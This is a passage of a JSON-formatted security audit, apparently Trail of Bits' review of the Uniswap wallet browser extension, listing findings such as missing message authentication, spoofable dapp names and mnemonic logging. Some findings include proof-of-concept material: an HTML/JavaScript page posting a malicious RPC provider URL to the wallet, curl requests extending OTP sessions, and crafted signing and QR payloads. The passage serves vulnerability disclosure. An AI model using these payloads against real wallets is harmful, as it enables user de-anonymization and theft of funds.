        "body": "The Uniswap wallet browser extension does not display all relevant data for manual verication by the user. At least the eth_signTypedData_v4 method is vulnerable. A Permit operation on the eth_signTypedData_v4 method causes the extension to display the owner and spender parameter information but not display the value, nonce, and deadline parameters. Figure 13.1: Uniswap wallet browser extension (rst image) displays less data than the Rabby wallet (second image) and the MetaMask wallet (third image) Exploit Scenario Alice connects her Uniswap wallet browser extension to a malicious dapp. The dapp uses the eth_signTypedData_v4 method to ask Alice for a signature to call a smart contracts permit function. The dapp tells Alice that the permitted value is small (e.g., 1 token). However, the dapp calls the eth_signTypedData_v4 method with a large value100,000 tokens. The wallet does not display the value information to Alice, and she incorrectly thinks that it is equal to the 1 token. She signs the message. The dapp drains Alices account. Recommendations Short term, make the browser extension display all relevant information to the user when handling the eth_signTypedData_v4 method. Review other methods and operations and ensure that they make the wallet display all relevant information.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "14. URL origin is explicitly constructed ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf",
        "body": "The extractBaseUrl function is used by the Uniswap wallet browser extension to transform a website URL to an origin. Later in the code, the origin is used to dierentiate websites. While the extractBaseUrl function is correct, it could be simplied. The origin eld of the URL class could be returned, which would make the function less error-prone. const parsedUrl = new URL(url) return `${parsedUrl.protocol}//${parsedUrl.hostname}${ parsedUrl.port ? ':' + parsedUrl.port : '' }` Figure 14.1: The main part of the extractBaseUrl function (universe/apps/stretch/src /background/features/dappRequests/utils.ts#811) Recommendations Short term, change the extractBaseUrl function to use the URLs origin eld.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "15. Uniswap dapp name can be spoofed ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf",
        "body": "The Uniswap wallet browser extension displays a dapps URL and title. If the dapp is hosted under the uniswap.org domain, instead of the title, the Uniswap string is displayed (gure 15.1). chrome.tabs.get(request.senderTabId, (tab) => { const newUrl = extractBaseUrl(tab.url) || '' setDappUrl(newUrl) setDappName(newUrl.endsWith('.uniswap.org') ? 'Uniswap' : tab.title || '') setDappIconUrl(tab.favIconUrl || '') }) Figure 15.1: Part of the DappRequestContent function (universe/apps/stretch/src/ background/features/dappRequests/DappRequestContent.tsx#6974) Because dapps can set their titles to arbitrary strings, a malicious dapp can use the Uniswap string as its title. If the uniswap.org domain should be specially treated by the wallet, the treatment should not be prone to spoong. Exploit Scenario Alice visits a malicious website that performs a phishing attack on her, imitating the uniswap.org domain. The website sets its title to Uniswap. Alice is asked to sign a transaction, and the Uniswap wallet browser extension displays her information, showing that the request comes from a dapp with the name Uniswap. Because Alice previously saw the same dapp name when using the original uniswap.org dapp, she trusts the request and signs it. Recommendations Short term, either remove special handling of the uniswap.org domain, or make the wallet display truly unique and non-spoofable data for that domain (e.g., an image or a change of colors that cannot be forged by an arbitrary website).",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "16. Injected content script and InjectedProvider class are not hardened ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf",
        "body": "The Uniswap wallet browser extension injects a content script (injected.js le) into every webpage. The injected content script runs in an isolated world from its parent webpage and creates an HTML script tag (ethereum.js le) that is added to the parent webpage. The script also creates an object of the InjectedProvider class and assigns it to the window.ethereum variable. The InjectedProvider class exposes internal elds and methods to the webpage. This exposure allows the webpage to manipulate the logic of the classmaliciously or accidentallyand increases the attack surface. Moreover, the webpage can communicate directly with the content script, bypassing any logic implemented by the InjectedProvider class. The InjectedProvider class should minimize exposure of its internal state and delegate as much logic as possible to the content script. On the other hand, the class is not strongly isolated from the webpageas the injected content script and extensions service worker areso minimizing exposure is only a best- eort security control. Additionally, the webpage ultimately controls its display layer and does not have to use the InjectedProvider class or the content script to perform any action not requiring the wallets key. Therefore, the responsibility for authentication and data validation lies on the service worker component. Recommendations Short term, minimize exposure of the InjectedProvider classs internal state. To do so, use the following mechanisms:  Private properties  Object sealing  Object freezing  Non-writable properties Move the internal state from the InjectedProvider class to the content scriptfor example, the chain ID, account addresses, and provider URL. Move logic responsible for authentication, data validation, and generation of requestIds to the content script. Long term, minimize the attack surface in the extension and aim to implement important business logic in more trusted components whenever possible.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "17. Runtime message listeners created by dappRequestListener function are never removed ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf",
        "body": "The dappRequestListener function is an event listener handler for messages (gure 17.1). The function creates a new instance of the chrome.runtime.onMessage listener (gure 17.2), but the listener is never removed. function addDappToExtensionRoundtripListener(): void { window.addEventListener('message', dappRequestListener) } Figure 17.1: The dappRequestListener function is used as an event listener. (universe/apps/stretch/src/contentScript/injected.ts#6466) async function dappRequestListener(event: MessageEvent): Promise<void> { {...omitted for brevity...} chrome.runtime.onMessage.addListener((message, sender: chrome.runtime.MessageSender) => { if ( sender.id !== extensionId || !isValidMessage<BaseDappResponse>(Object.values(DappResponseType), message) ) { return } {...omitted for brevity...} }) Figure 17.2: The dappRequestListener creates a new chrome.runtime.onMessage listener on every call. (universe/apps/stretch/src/contentScript/injected.ts#2646) To debug the issue, open a website, connect the wallet to the website, set a breakpoint in the injected.ts le on line 36, and run the following code multiple times in the Chrome Developer Tools console: window.postMessage({'type':'GetAccount', 'x':'whatever'}) The breakpoint will be hit increasingly many times after every call to the postMessage method. To create a breakpoint, open the Chrome Developer Tools console, go to the Sources tab, switch to the Content scripts tab in the left panel, and open the injected.js le. Use the search panel to nd the dappRequestListener function and click on the selected line number (gure 17.3). Figure 17.3: Chrome Developer Tools console with a breakpoint set Exploit Scenario Alice visits a malicious dapp. The dapp spams the Uniswap wallet with messages, forcing the content script to create a large number of message listeners. Alices browser hangs. Recommendations Short term, modify the code to remove chrome.runtime.onMessage listeners when they complete their work. Have the listener validate the requestId eld of a message before handling the message and before the listener itself is removedthis change will ensure that the listener handles only the response for a previously issued request. Long term, instead of creating new listeners, have the code read responses from calls to the chrome.runtime.sendMessage function. This change requires the background script to send responses using the sendResponse function (the third argument to a listener handler). Alternatively, implement long-lived connections. References  How to remove event listener in Chrome extension",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "18. isValidMessage function checks only message type ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf",
        "body": "The isValidMessage function does not check all properties (elds) of a message. It checks only the type. Specically, the function does not ensure that the message is of the given type T because the is T check is not performed at runtime. In other words, the function fails to verify that a message has all the required elds, that it does not have unexpected elds, and that the elds are of the correct type. export function isValidMessage<T>(typeValues: string[], message: unknown): message is T { if (!isMessageWithType(message)) { return false } return typeValues.includes(message.type) } Figure 18.1: The is T validation is not performed at runtime. (universe/apps/stretch/src/background/utils/messageUtils.ts#6975) Moreover, the function does not validate properties of a messages elds specic to the messages type. It should check properties such as number ranges, string lengths, and string formats. For example, messages of type SendTransaction should have elds like nonce and value that are numbers and must have to and from elds that are strings. The severity of the nding is undetermined because we were unable to produce a proof-of- concept exploit due to time constraints. The exploit scenario below is theoreticalit crashes the sidebar instead of forcing it to display incorrect data. However, in the worst case, the issue may enable such critical exploits as cross-site scripting (XSS) inside the extension. Exploit Scenario A malicious dapp uses the Ethereum API to make a request of eth_sendTransaction type. The dapp sets the messages value to an object, and the message is sent to the background service worker, which displays the value in the sidebar dierently than it is processed by the transaction-signing code. A dapp user is tricked into sending more tokens than they agreed to. const result = await ethereum.request({ method: 'eth_sendTransaction', params: [{ data: ['0x1234', '4567'], from: accounts[0], to: 'test', value: {'_hex': '0x1234'}, }] }); Figure 18.2: An example request with dierent eld types than expected by the extension Recommendations Short term, make the isValidMessage function validate types of messages elds at runtimeimplement the validation logic in the functions body. Long term, add negative tests that will check whether the isValidMessage function returns false when given a message containing elds with unexpected types. Ensure the function validates other properties of messages than typesfor example, the lengths, formats, and number ranges. References  The Dangers of Square Bracket Notationexample attack vector that may be enabled by lack of data type validation",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "19. Missing message authentication in content script ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf",
        "body": "The Ethereum API creates two event listeners: one in the initExtensionToDappOneWayListener function and one in the sendRequestAsync function. Neither listener validates the events source. A malicious dapp can post a message to a website with a dierent origin and the message will be accepted. private initExtensionToDappOneWayListener = (): void => { const handleDappRequest = async (event: MessageEvent<BaseExtensionRequest>): Promise<void> => { const messageData = event.data {...omitted for brevity...} } // This listener isn't removed because it's needed for the lifetime of the app // TODO: Check for active tab when listening to events window.addEventListener('message', handleDappRequest) } Figure 19.1: The initExtensionToDappOneWayListener function does not authenticate the source of the event. (universe/apps/stretch/src/contentScript/InjectedProvider.ts#123144) function sendRequestAsync<T extends BaseDappResponse>( request: BaseDappRequest, responseType: T['type'], timeoutMs = ONE_HOUR_MS ): Promise<T | ErrorResponse> { return new Promise((resolve, reject) => { {...omitted for brevity...} const handleDappRequest = (event: MessageEvent<any>): void => { const messageData = event.data if ( messageData?.requestId === request.requestId && isValidMessage<T | ErrorResponse>( [responseType, DappResponseType.ErrorResponse], messageData ) ) { {...omitted for brevity...} } } window.addEventListener('message', handleDappRequest) {...omitted for brevity...} }) } Figure 19.2: The sendRequestAsync function does not authenticate the source of the event; it checks only the requestId, which can be guessed or snied by malicious websites. (universe/apps/stretch/src/contentScript/InjectedProvider.ts#563595) Exploit Scenario Alice opens a malicious website and clicks a button. The website opens a new window with the Uniswap application. The website then sends a SwitchChain message to Uniswap. The message contains a URL for a malicious JSON RPC provider. Uniswaps Ethereum API accepts the message and changes the RPC provider. Alice uses the Uniswap website with the attacker-controlled JSON RPC provider. The website displays Alice's data incorrectly. Moreover, the attacker knows Alices IP address and wallet address and can de-anonymize her. The exploit proof of concept is shown in gure 19.3. <!DOCTYPE html> <html> <head> <meta charset=\"utf-8\"> <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"> <title>Uniswap extension - TOB-UNIEXT-16</title> </head> <body> <div id=\"button\">Button</div> <div id=\"result\">result</div> <style type=\"text/css\"> #button { height: 200px; width: 200px; border: 1px solid red; } </style> <script type=\"text/javascript\"> let new_window = null; button.onclick = async () => { (async () => { try { await poc(); } catch(err) { console.error(err); } })() }; async function poc() { try { console.log('Start TOB-UNIEXT-16 PoC'); new_window = open('https://app.uniswap.org/') await new Promise(r => setTimeout(r, 4000)); console.log('Sending msg'); new_window.postMessage({'type': 'SwitchChain', 'chainId': -1, 'providerUrl': {'url': 'https://malicious-infura.example.com'} }, '*'); // wait for requests or manually execute code below in the new window // window.ethereum.request({'method': 'eth_blockNumber'}); } catch (err) { console.error(err); } } </script> </body> </html> Figure 19.3: Proof-of-concept exploit Recommendations Short term, add the missing events source authentication to the initExtensionToDappOneWayListener and sendRequestAsync functions to ensure that event.source === window before the functions process any messages. If the listeners described in the nding should handle messages only from the extension and should not handle requests from the website, then use the Chrome messaging API (chrome.runtime.onMessage.addListener) instead of the events API (window.addEventListener). This change would require implementing the recommendations from TOB-UNIEXT-16. Long term, document authentication and data validation requirements for all message- passing logic in the extension. 20. Data displayed for user conrmation may di\u0000er from actually signed data Severity: Medium Diculty: High Type: Data Validation Finding ID: TOB-UNIEXT-20 Target: Uniswap wallet browser extension",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "21. Possibility to create multiple OTPs for a specic UUID ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf",
        "body": "When the Uniswap browser extension sends a request to obtain a new UUID session, it is automatically invalidated after two minutes. However, when the Uniswap mobile application sends other requests with the blob with an encrypted mnemonic to obtain an OTP, the UUID session timeout can be indenitely extended (gure 21.1). Additionally, for each blob sent with the specic UUID, the ve possible attempts for the specic UUID are renewed. $ curl -i -s -k -X $'POST' \\ -H $'Host: gateway.uniswap.org' -H $'Content-Type: https://uniswap.org' -H $'Content-Length: 60' \\ --data-binary $'{\\\"uuid\\\":\\\"9eee5a14-f50e-4df8-b6e2-07f9db2c8239\\\",\\\"blob\\\":\\\"xyz\\\"}' \\ $'https://gateway.uniswap.org/v2/scantastic/blob' HTTP/2 200 date: Fri, 16 Feb 2024 15:15:40 GMT // (...) {\"otp\":\"594035\",\"expiresAtInSeconds\":1708096660} $ curl -i -s -k -X $'POST' \\ -H $'Host: gateway.uniswap.org' -H $'Content-Type: https://uniswap.org' -H $'Content-Length: 60' \\ --data-binary $'{\\\"uuid\\\":\\\"9eee5a14-f50e-4df8-b6e2-07f9db2c8239\\\",\\\"blob\\\":\\\"xyz\\\"}' \\ $'https://gateway.uniswap.org/v2/scantastic/blob' HTTP/2 200 date: Fri, 16 Feb 2024 15:15:42 GMT // (...) {\"otp\":\"201442\",\"expiresAtInSeconds\":1708096662} $ curl -i -s -k -X $'POST' \\ -H $'Host: gateway.uniswap.org' -H $'Content-Type: https://uniswap.org' -H $'Content-Length: 60' \\ --data-binary $'{\\\"uuid\\\":\\\"9eee5a14-f50e-4df8-b6e2-07f9db2c8239\\\",\\\"blob\\\":\\\"xyz\\\"}' \\ $'https://gateway.uniswap.org/v2/scantastic/blob' HTTP/2 200 date: Fri, 16 Feb 2024 15:15:43 GMT // (...) {\"otp\":\"579658\",\"expiresAtInSeconds\":1708096663} Figure 21.1: An innite session expiration for a specic UUID Exploit Scenario An attacker nds a way to obtain Bobs UUID and tricks Bobs mobile application into sending his encrypted seed in an innite loop. Although a new OTP is generated independently, it increases the attackers chances of guessing the OTP. Eventually, the attacker guesses the OTP and steals Bobs funds. Recommendations Short term, modify the code so that when a UUID is created, the expiration is set to two minutes. Then when a blob with a specic UUID is sent and a user obtains the OTP, set another two-minute expiration, but do not allow further extending a session. Additionally, consider not accepting the creation of another UUID-OTP pair if it exists in the database. Long term, add unit tests that cover the scenario of extending the session timeout.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "22. Missing sender.id and sender.tab checks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf",
        "body": "The Uniswap wallet browser extension does not limit background message listeners to messages originating from the extension itself (i.e., the sender.id eld is not consulted). Moreover, the extension does not dierentiate between messages from content scripts and messages from other extension components (i.e., the sender.tab eld is not veried). The listeners should not normally receive messages that do not originate from the extension, so the sender.id check is only a defense-in-depth security control. /** Listens for the OnboardingComplete event to initialize the app. */ async function onboardingCompleteListener( request: BaseDappRequest | BaseExtensionRequest ): Promise<void> { if ( isValidMessage<BaseExtensionRequest>( [ExtensionToBackgroundRequestType.OnboardingComplete], request ) ) { // If the user is in the onboarding flow then we need to reinitialize the store // so that the sidepanel can be connected to the new store. chrome.runtime.onMessage.removeListener(onboardingCompleteListener) chrome.runtime.onMessage.removeListener(rejectionRequestListener) await initApp(true) } } Figure 22.1: A listener missing the sender.id check (universe/apps/stretch/src/background/index.ts#193209) const listener = (message: MessageEvent): void => { if (message.type === ExtensionToBackgroundRequestType.OnboardingComplete) { setForgotPasswordModalOpen(false) chrome.runtime.onMessage.removeListener(listener) } } chrome.runtime.onMessage.addListener(listener) Figure 22.2: A listener missing the sender.id check (universe/apps/stretch/src/app/features/lockScreen/Locked.tsx#8188) async function rejectionRequestListener( request: BaseDappRequest, sender: chrome.runtime.MessageSender ): Promise<void> { if (!isValidMessage<BaseDappRequest>(Object.values(DappRequestType), request)) { return } Figure 22.3: A listener missing the sender.id check (universe/apps/stretch/src/background/index.ts#173179) chrome.runtime.onMessage.addListener(async (message, sender) => { if ( sender.id === extensionId && isValidMessage<{ type: BackgroundToExtensionRequestType }>( Object.values(BackgroundToExtensionRequestType), message ) && message.type === BackgroundToExtensionRequestType.StoreInitialized ) { await initContentWindow() } }) Figure 22.4: A listener implementing the sender.id check (universe/apps/stretch/src/sidebar/sidebar.tsx#2536) The dierentiation between content scripts and other components is done by checking a messages custom type eld, which is fully controlled by the message sender. A compromised content script can send messages in the name of other components. We did not nd an exploitable attack vector for an attacker-controlled content script, so the severity of the nding has been set to informational. Exploit Scenario Alice visits a malicious website. The website exploits a vulnerability in the Chrome browser and compromises the renderer process. The website has full access to the extensions content script. It sends messages with arbitrary types to the extensions background and sidePanel components. Recommendations Short term, add checks for the sender.id property in the message listeners shown in gures 22.1, 22.2, and 22.3. And checks for the sender.tab property in all listeners. The property should be non-null if sent by a content script and null otherwise.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "23. Mnemonic and local password disclosed in console ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf",
        "body": "The Uniswap wallet browser extension logs the mnemonic and the extensions password in the console when the importAccount action is triggeredboth during the wallet initialization by the QR code and while importing a recovery phrase (gure 23.1). Figure 23.1: The exposed credentials when initializing a wallet Exploit Scenario Bob, who knows that the standard security rules require crypto wallets to not reveal his mnemonics, has trouble during the Uniswap wallet browser extension initialization and tries to nd help. An attacker oers to help and asks Bob to send him console logs to troubleshoot. Bob, convinced that he does not reveal anything crucial, sends the logs. The attacker immediately receives Bobs mnemonic and steals all his funds. Recommendations Short term, enable the loggerMiddleware constant only in development mode (gure 23.2). 17 18 19 20 21 export const store = createStore({ reducer: onboardingReducer, additionalSagas: [onboardingRootSaga], middlewareBefore: [loggerMiddleware], middlewareBefore: __DEV__ ? [loggerMiddleware] : [], // proposed fix }) Figure 23.2: The proposed x to enable loggerMiddleware only in development mode (universe/apps/stretch/src/onboarding/onboardingStore.ts#1721) Long term, periodically review whether the browser extension logs any sensitive data in the production release.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "24. Incorrect message in mobile application when wallet fails to pair ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf",
        "body": "The Uniswap mobile application shows the Success notication to the user even when the pairing with the Uniswap wallet browser extension fails (gure 24.1). The bug occurs when a user scans a QR code without the n modulus in the pubKey parameter (gure 24.2) and obtains an OTP. When the user sends the OTP in the browser extension, they receive the empty encryptedSeed parameter from the underlying server request (gure 24.3). So pairing the wallet does not succeed, returning an error message, The code you submitted is incorrect, or there was an error submitting. Please try again, in the browser extension and Success in the mobile application. Figure 24.1: The misleading Success notication when the pairing with the Uniswap wallet browser extension fails scantastic://pubKey={\"alg\":\"RSA-OAEP-256\",\"e\":\"AQAB\",\"ext\":true,\"key_ops\":[\"encrypt\" ],\"kty\":\"RSA\",\"n\":\"\"}&uuid=f24e573d-4448-465e-91ff-af0354d95bf2&vendor=Apple&model=M acintosh&browser=Chrome Figure 24.2: An example of incorrect data in the QR code to pair the wallet POST /v2/scantastic/otp HTTP/2 Host: gateway.uniswap.org Origin: chrome-extension://hphjliglndmknaonickmcgddplaeekln {\"uuid\":\"f24e573d-4448-465e-91ff-af0354d95bf2\",\"otp\":\"061116\"} HTTP/2 200 OK // (...) {\"encryptedSeed\":\"\"} Figure 24.3: An example request-and-response cycle that obtains an empty seed from the Uniswap server Recommendations Short term, in the Uniswap mobile application, modify the code to strictly validate the underlying pubKey parameters in the QR code and return an error if the parameters do not meet specic criteria. Additionally, do not send a request and return an error when a blob to be sent to the Uniswap server is an empty string. Long term, to ensure that the browser extension and mobile application correctly handle errors, extend the testing suite to cover the scenario where a QR code has a valid UUID session but incorrect pubKey parameters.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "25. Mobile application crash when pubKey in a QR code is invalid JSON ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf",
        "body": "The Uniswap mobile wallet crashes when a scanned QR code contains invalid JSON because the pubKey parameter is directly passed to the JSON.parse function without proper error handling. 44 const pubKey: JsonWebKey = initialState?.pubKey ? JSON.parse(initialState?.pubKey) : undefined Figure 25.1: Part of the ScantasticModal function that directly tries to parse the public key from a QR code (universe/apps/mobile/src/features/scantastic/ScantasticModal.tsx#44) For example, the Uniswap mobile wallet crashes when a user scans the QR code that represents the following data: scantastic://pubKey={\"alg\":\"\",\"e\":\"\",\"ext\":,\"key_ops\":[\"\"],\"kty\": \"\",\"n\":\"abc\"}&uuid=e9d3c5ce-7f20-40d5-9956-44f4baee21a1&vendor=&m odel=&browser= Figure 25.2: An example QR code that crashes the Uniswap mobile wallet Recommendations Short term, implement the error handling of the pubKey parameter by using a try-catch statement. Long term, identify other locations in the mobile application where a user-provided value to JSON.parse may crash the application. Add fuzz tests to the solution to cover other edge-case scenarios resulting from improper error handling.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "26. signMessage method is broken for non-string messages ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf",
        "body": "The Uniswap wallet browser extension uses the NativeSigner class to sign messages. However, the classs signMessage method is invalid and will not sign some messages. The signMessage method (gure 26.1) encodes a non-string message to a hex string with the hexlify function, removes the 0x prex, and calls the signHashForAddress method, which then calls the signingKey.signDigest method (gure 26.2). signMessage(message: string | Bytes): Promise<string> { if (typeof message === 'string') { return Keyring.signMessageForAddress(this.address, message) } // chainID isn't available here, but is not needed for signing hashes so just default to Mainnet return Keyring.signHashForAddress(this.address, hexlify(message).slice(2), ChainId.Mainnet) } Figure 26.1: The signMessage method (universe/packages/wallet/src/features/ wallet/signing/NativeSigner.ts#3037) The signingKey.signDigest method calls the arrayify function on the message (digest variable), but this function requires the string to be prexed with the 0x string. Because of that, the function always throws an exception. signDigest(digest: BytesLike): Signature { const keyPair = getCurve().keyFromPrivate(arrayify(this.privateKey)); const digestBytes = arrayify(digest); if (digestBytes.length !== 32) { logger.throwArgumentError(\"bad digest length\", \"digest\", digest); } const signature = keyPair.sign(digestBytes, { canonical: true }); Figure 26.2: The signDigest method (ethers.js/packages/signing-key/src.ts/index.ts#5460) The bug is fortunate: if the 0x prex was not removed and the signDigest method could succeed, then the personal_sign Ethereum API request would sign a hash instead of a message formatted in accordance with the EIP-191 standard. In other words, the personal_sign request would behave the same as the deprecated eth_sign request. The personal_sign request should not call the signHashForAddress method under any circumstances. There is one more issue: a personal_sign message is sometimes hex-decoded one too many times. The full ow of a message for the personal_sign request is described below. The personal_sign request is handled by the handleEthSignMessage function (gure 26.3) in the content script. The function hex-decodes a message (via the toUtf8String method, which calls the arrayify function under the hood) and sends it to the background. const request: SignMessageRequest = { type: DappRequestType.SignMessage, requestId: uuidv4(), messageHex: ethers.utils.toUtf8String(messageHex), } Figure 26.3: The content script sends a hex-encoded message to the background. (universe/apps/stretch/src/contentScript/InjectedProvider.ts#348352) The background calls the handleSignMessage method (gure 26.4), which calls the signMessage method. case DappRequestType.SignMessage: yield* call(handleSignMessage, confirmedRequest) break Figure 26.4: Part of the dappRequestApprovalWatcher function (universe/apps/stretch/src/background/features/dappRequests/dappRequestAp provalWatcherSaga.ts#4850) The signMessage method optionally hex-decodes the message and passes it to the signer.signMessage method (gure 26.5). The decoded message may be either a string or an array. This is when the redundant hex-decoding may occur. export async function signMessage( message: string, {...omitted for brevity...} ): Promise<string> { {...omitted for brevity...} const formattedMessage = isHexString(message) ? arrayify(message) : message const signature = await signer.signMessage(formattedMessage) return ensureLeading0x(signature) } Figure 26.5: The rst signMessage method (universe/packages/wallet/src/features/wallet/signing/signing.ts#1225) The following signMessage method (gure 26.6) calls either signMessageForAddress or signHashForAddress, depending on the type of message. signMessage(message: string | Bytes): Promise<string> { if (typeof message === 'string') { return Keyring.signMessageForAddress(this.address, message) } // chainID isn't available here, but is not needed for signing hashes so just default to Mainnet return Keyring.signHashForAddress(this.address, hexlify(message).slice(2), ChainId.Mainnet) } Figure 26.6: The second signMessage method (universe/packages/wallet/src/ features/wallet/signing/NativeSigner.ts#3037) The signMessageForAddress method adds the EIP-191 prex, but the signHashForAddress method does notthis method signs raw, 32-byte hashes. async signMessageForAddress(address: string, message: string): Promise<string> { {...omitted for brevity...} return wallet.signMessage(message) } /** * @returns the Signature of the signed hash in string form. **/ async signHashForAddress(address: string, hash: string, _chainId: number): Promise<string> { {...omitted for brevity...} const signature: Signature = signingKey.signDigest(hash) return joinSignature(signature) } Figure 26.7: The two signing methods (universe/packages/wallet/src/features/ wallet/Keyring/Keyring.web.ts#385405) Exploit Scenario A dapp makes a personal_sign request with the message shown in gure 26.8. await window.ethereum.request({ method: 'personal_sign', params: ['0x30786361666530303030636166653030303063616665303030306361666530303030', from], }); Figure 26.8: Example message triggering the bug The following message is displayed in the sidebar: 0xcafe0000cafe0000cafe0000cafe0000 Figure 26.9: Message displayed to users The message is passed to the signMessage method (gure 26.6) as a Uint8Array: [202, 254, 0, 0, 202, 254, 0, 0, 202, 254, 0, 0, 202, 254, 0, 0] Figure 26.10: Message as seen by the signing function The message is then hex-encoded into a string (without the 0x prex) and passed to the signHashForAddress method. The method calls the signDigest method, which throws an error. A perfectly valid message cannot be signed by the Uniswap wallet. The root cause of the bug is that the message in gure 26.9 is hex-decoded, but it should not be. For comparison, consider the request form in gure 26.11. await window.ethereum.request({ method: 'personal_sign', params: ['0x4141', from], }); Figure 26.11: A message that is handled correctly (i.e., is not doubly decoded) It is displayed as the AA string and signed as this string. Recommendations Short term, modify the signMessage method by removing either the call to the signHashForAddress method or the slicing operation. Ensure that the personal_sign request will not result in a call to a digest signing method but will instead always call a message signing method that follows EIP-191. In particular, ensure that the correct signing method is called when the message is not a string but, for example, an array. Alternatively, accept only string messages. Resolve the double-decoding issueit requires additional debugging to conrm why and where the problem exists. Add unit tests for the personal_sign request with payloads similar to those from the Exploit Scenario section and with non-string payloads (e.g., arrays, objects). Ensure that the message displayed to users for signing always matches what is actually signedthis recommendation should be implemented with the one from TOB-UNIEXT-11. Long term, document methods with information about arguments types and encodings. Minimize the amount of redundant hex-encoding and -decoding operations between function calls. Strictly validate types of data coming from the content script component.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "27. Price of stablecoins is hard coded ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf",
        "body": "The Uniswap wallet browser extension uses a hard-coded price of 1 USD for selected stablecoins (see gure 27.1). The actual price of a stablecoin may vary from 1 USD. The wallet incorrectly determines the prices of stablecoins when their real price varies signicantly from 1 USD. The hard-coded price informs users about the estimated transaction and fee prices (gure 27.2). Presenting incorrect estimates may misguide users. The impact of the nding is undetermined because the hard-coded price is mostly used in the Super Swap functionality, which was not audited. if (currencyIsStablecoin) { // handle stablecoin return new Price(stablecoin, stablecoin, '1', '1') } Figure 27.1: Part of the useUSDCPrice method, which is used by the useUSDValue method (universe/packages/wallet/src/features/routing/useUSDCPrice.ts#6164) const gasFeeUSD = useUSDValue(chainId, networkFee) Figure 27.2: Example use of the useUSDValue method (universe/apps/stretch/src/background/features/dappRequests/requestConten t/SendTransactionContent.tsx#28) Exploit Scenario The price of a stablecoin drops signicantly. However, the Uniswap wallet fails to detect the change and reports the price as 1 USD. Uniswap wallet users are misguided when performing transactions. Recommendations Short term, research the impact of unexpectedly high stablecoin price volatility on the system. Evaluate the security risk of the scenario if a stablecoinwhose price is assumed to be 1 USD by the extensiondepegs signicantly. If the risks are nonnegligible, consider removing the hard-coded price from the useUSDCPrice method.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "28. Encrypted mnemonics and private keys do not bind ciphertexts to contexts ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf",
        "body": "The Uniswap wallet browser extension stores multiple encrypted private keys in Chromes local storage. Names (i.e., keys) of the items in the storage consist of a constant prex and a public address (hex-encoded). com.uniswap.web.mnemonic.0xB86621005d9D29F0C27460A8324de852b91b79b1 com.uniswap.web.privateKey.0x0A6D9eC5Aac72336ed8e2d0C6Aad824F69EB30c6 com.uniswap.web.privateKey.0x3dE087fF647C444bD4C1991F651926927d48f76C Figure 28.1: Example keys of items stored in Chromes local storage Values of the items are encrypted private keys. Encryption uses AES-GCM mode with a random initialization vector (IV) and no additional authenticated data. Encrypted content is not cryptographically bound to the relevant public address. Exploit Scenario Alice visits a malicious website. The website exploits Chromes renderer process, gaining full access to the extensions content script. It uses the content script to swap two encrypted private keys (i.e., storage item with public address A holds private key B and storage item with public address B holds private key A). Alice uses the extension to sign a transaction. She selects address A for the signing. The wallet decrypts the swapped item to private key B. The wallet signs and broadcasts the transaction from the wrong address without Alices consent. Recommendations Short term, bind encrypted data to relevant contextto the public address of a key or mnemonicby taking either of the following steps:  Modify encryption and decryption methods to include the public address in a ciphertext as additional authenticated data.  Modify the decryption method to validate that the decrypted private key matches the public address. Long term, when dealing with encrypted data, do not assume any properties of corresponding plaintext beyond what is explicitly in the ciphertext. Encrypted messages, even if authenticated or signed, may be replaced with any other message authenticated or signed with the same key.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "29. Local storage is not authenticated ",
